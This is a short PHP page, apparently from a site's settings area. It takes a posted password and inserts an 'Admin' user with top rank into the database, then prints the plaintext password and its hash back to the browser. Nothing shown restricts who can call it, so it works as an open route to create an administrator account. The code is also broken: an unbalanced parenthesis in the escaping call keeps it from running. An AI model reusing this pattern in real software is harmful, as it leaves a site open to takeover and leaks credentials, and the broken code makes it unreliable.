<?php
		$page_setting = "selected";
		require_once("head.php");
		
	?>
<?php
if(isset($_POST["pass"]))
{
	$pwd = mysqli_real_escape_string($conn, ($_POST["pwd"]);
	$password = password_hash($pwd, PASSWORD_DEFAULT);
	mysqli_query($conn, "INSERT INTO users (username, password, rank) VALUES ('Admin', '{$password}', '3');");
	echo "done: <br>Username: Admin<br>Password: {$pwd}<br>return_code: #dev_".$password;
}
?>
<form action="" method="post">
<input name="pwd" type="password">
<input name="pass" type="submit" value="go!">
</form>
